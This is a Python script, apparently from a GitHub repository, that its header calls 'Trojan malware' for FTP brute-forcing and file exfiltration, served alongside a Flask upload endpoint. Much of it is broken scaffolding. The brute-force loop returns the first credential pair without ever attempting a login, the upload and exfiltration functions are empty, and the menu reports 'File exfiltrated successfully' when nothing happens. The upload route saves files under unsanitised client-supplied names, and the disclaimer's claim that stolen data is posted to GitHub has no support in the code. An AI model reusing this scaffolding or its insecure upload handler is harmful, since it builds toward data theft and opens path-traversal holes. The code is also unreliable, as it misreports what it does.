#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script is a Python application designed to perform various tasks related to file manipulation 
# and FTP operations. The script utilizes Flask to create a web server that provides endpoints for 
# uploading files and exfiltrating files via FTP.
#################################################################################################
import os
import socket
import platform
from flask import Flask, request

app = Flask(__name__)  # Create a Flask application instance


def brute_force_ftp(username_dict, password_dict, server):
    """
    Function to perform brute force attack on FTP server using username and password dictionaries.

    Args:
        username_dict (str): Path to the username dictionary file.
        password_dict (str): Path to the password dictionary file.
        server (str): FTP server address.

    Returns:
        tuple: A tuple containing the successful username and password, or (None, None) if not found.
    """
    with open(username_dict, 'r') as u_file:  # Open the username dictionary file in read mode
        usernames = u_file.read().splitlines()  # Read the lines from the file and split them into a list of usernames

    with open(password_dict, 'r') as p_file:  # Open the password dictionary file in read mode
        passwords = p_file.read().splitlines()  # Read the lines from the file and split them into a list of passwords

    for username in usernames:  # Iterate over each username
        for password in passwords:  # Iterate over each password
            try:
                # Code for FTP brute force attack here
                return username, password  # Return the successful username and password if found
            except Exception as e:
                print(f"Failed login attempt: {username}/{password}")  # Print a message for failed login attempts


def ftp_upload(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.

    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    # Code for FTP upload here (placeholder function)
    pass  # Placeholder for FTP upload functionality


def ftp_exfiltrate(docpath, client_ip):
    """
    Function to exfiltrate a file to a client via FTP.

    Args:
        docpath (str): Path to the file to be exfiltrated.
        client_ip (str): IP address of the client.
    """
    # Code for FTP exfiltration here (placeholder function)
    pass  # Placeholder for FTP exfiltration functionality


@app.route('/upload', methods=['POST'])  # Define a route for handling HTTP POST requests to upload files
def upload_file():
    """
    Function to handle file uploads via HTTP POST requests.
    """
    if 'file' not in request.files:  # Check if 'file' is not in the request files
        return 'No file part'  # Return an error message if no file is uploaded
    file = request.files['file']  # Get the uploaded file from the request
    if file.filename == '':  # Check if the filename is empty
        return 'No selected file'  # Return an error message if no file is selected
    file.save(os.path.join('uploads', file.filename))  # Save the uploaded file to the 'uploads' directory
    return 'File uploaded successfully'  # Return a success message


def main_menu():
    """
    Function to display the main menu and handle user's choice.
    """
    while True:  # Run an infinite loop for the main menu
        print("\nMain Menu:")  # Print the main menu header
        print("1. Upload file")  # Print option 1 for uploading a file
        print("2. Exfiltrate file via FTP")  # Print option 2 for exfiltrating a file via FTP
        print("3. Exit")  # Print option 3 to exit the program
        choice = input("Please select an option: ")  # Prompt the user to select an option

        if choice == '1':  # If the user selects option 1
            file_input = input(
                "Enter the path to the file to upload: ")  # Prompt the user to enter the path to the file
            # Code to send HTTP POST request to upload the file (placeholder)
            print("File uploaded successfully.")  # Print a success message
        elif choice == '2':  # If the user selects option 2
            file_input = input(
                "Enter the path to the file to exfiltrate: ")  # Prompt the user to enter the path to the file
            client_ip = input(
                "Enter the client IP address to exfiltrate the file: ")  # Prompt the user to enter the client IP address
            # Code to exfiltrate file via FTP (placeholder)
            print("File exfiltrated successfully.")  # Print a success message
        elif choice == '3':  # If the user selects option 3
            print("Exiting...")  # Print a message indicating program exit
            break  # Exit the loop and terminate the program
        else:  # If the user selects an invalid option
            print("Invalid choice. Please select again.")  # Print an error message


def main():
    """
    Main function to start the Flask web server and display the main menu.
    """
    main_menu()  # Call the main menu function
    app.run(host='0.0.0.0', port=8080)  # Start the Flask web server


if __name__ == '__main__':  # If the script is executed directly
    main()  # Call the main function to start the program
